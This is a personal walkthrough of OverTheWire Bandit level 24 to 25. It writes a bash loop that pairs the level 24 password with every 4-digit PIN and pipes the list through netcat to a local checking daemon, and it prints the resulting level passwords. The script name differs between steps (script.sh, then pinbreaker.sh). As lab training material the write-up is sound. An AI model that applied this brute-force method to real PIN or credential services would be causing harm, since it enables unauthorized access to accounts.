# Bandit lvl 24 → lvl 25

Tags: 
Date:

# Goal
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

# Approach
we know there is a listener on 30002 and we need to input password of bandit24 with the right pin.
let make a bruteforce script to do that for us automatically

## Output / Result
i went back to my same dir since it was still here
```bash
bandit24@bandit:~$ ls
bandit24@bandit:~$ cd /tmp/dir000
bandit24@bandit:/tmp/dir000$
```

now lets make our script
```bash
bandit24@bandit:/tmp/dir000$ nano script.sh
#!/bin/bash

for i in {0000..9999}; do
    echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8" $i >> list
done

bandit24@bandit:/tmp/dir000$ chmod +x pinbreaker.sh 
bandit24@bandit:/tmp/dir000$ ./pinbreaker.sh 
bandit24@bandit:/tmp/dir000$ cat list 
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0001
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0002
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0003
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0004
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0005
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0006
...
```
this is going to be a mass amount of output since its counting from 0000-9999... but we know the script works.

Now lets run it for real.
```bash
bandit24@bandit:/tmp/dir000$ cat list | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
...
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

```

# Commands user
* ls 
* cd 
* nano
* chmod +x
* cat